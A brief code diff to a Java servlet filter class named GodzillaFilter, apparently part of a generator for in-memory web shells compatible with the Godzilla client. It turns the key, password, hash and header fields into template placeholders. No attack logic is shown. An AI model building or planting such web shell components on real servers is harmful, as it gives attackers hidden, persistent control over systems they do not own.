@@ -13,11 +13,11 @@ import java.io.IOException;
  * @author ReaJason
  */
 public class GodzillaFilter extends ClassLoader implements Filter {
-    public String key;
-    public String pass;
-    public String md5;
-    public String headerName;
-    public String headerValue;
+    public String key = "{{key}}";
+    public String pass = "{{pass}}";
+    public String md5 = "{{md5}}";
+    public String headerName = "{{headerName}}";
+    public String headerValue = "{{headerValue}}";
 
     public GodzillaFilter() {
     }
